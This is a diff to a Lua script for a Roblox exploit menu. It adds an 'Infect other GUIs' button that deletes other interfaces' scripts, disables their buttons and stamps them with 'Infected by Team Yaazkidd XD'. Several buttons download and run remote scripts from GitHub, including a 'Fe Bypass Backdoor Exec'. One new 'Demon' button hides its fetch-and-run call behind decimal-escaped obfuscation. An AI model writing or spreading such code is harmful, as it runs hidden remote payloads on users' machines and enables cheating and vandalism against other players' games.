@@ -2033,6 +2033,57 @@ end)
         end)
     end)
 
+createButton("Infect other GUIs", function()
+    local function RemoveScripts(object)
+        for _, descendant in pairs(object:GetDescendants()) do
+            if descendant:IsA("LuaSourceContainer") then
+                descendant:Destroy()
+            end
+        end
+    end
+
+    local function ChangeAllTextAndColor()
+        local myGui = game.CoreGui:FindFirstChild("Yaaz GUI v1") -- Replace with your actual GUI name
+
+        for _, object in pairs(game:GetDescendants()) do
+            if object:IsA("TextButton") or object:IsA("TextLabel") then
+                local objectGui = object:FindFirstAncestorOfClass("ScreenGui")
+
+                -- Exclude your GUI from infection
+                if objectGui ~= myGui then
+                    RemoveScripts(object)
+
+                    -- Disable clicking
+                    if object:IsA("TextButton") then
+                        object.Active = false
+                        object.AutoButtonColor = false
+                    end
+
+                    spawn(function()
+                        local function RainbowTextAndColor()
+                            local hue = 0
+                            local saturation = 1
+                            local value = 1
+                            local rainbowSpeed = 90
+                            while true do
+                                local rainbowColor = Color3.fromHSV(hue, saturation, value)
+                                object.TextColor3 = Color3.new(0, 0, 0)
+                                object.BackgroundColor3 = rainbowColor
+                                object.Text = "Infected by Team Yaazkidd XD"
+                                hue = (hue + (1 / rainbowSpeed)) % 1
+                                wait(0.03)
+                            end
+                        end
+                        RainbowTextAndColor()
+                    end)
+                end
+            end
+        end
+    end
+
+    ChangeAllTextAndColor()
+end)
+
     createButton("Lag", function()
         while true do
             for i = 1, 500 do
@@ -2059,7 +2110,7 @@ end)
     end)
 
     createButton("Fe Bypass Backdoor Exec made by Yaaz", function()  
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/moedlol/atop/refs/heads/main/I%20fling"))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/moedlol/FeBypass/refs/heads/main/Executor"))()
     end)
 
     createButton("c00lkidd gui", function()  
@@ -2068,6 +2119,10 @@ end)
 
     createButton("Quitos", function()  
         loadstring(game:HttpGet("https://raw.githubusercontent.com/moedlol/QUitos/refs/heads/main/sigma%20quitos"))()  
+    end)
+
+    createButton("Demon (too overpowered)", function()  
+        loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\103\48\48\108\88\112\108\111\105\116\101\114\47\103\48\48\108\88\112\108\111\105\116\101\114\47\109\97\105\110\47\70\101\37\50\48\98\121\112\97\115\115\34\44\32\116\114\117\101\41\41\40\41\10")()   
     end)
 
     createButton("Custom hint/Message", function()  
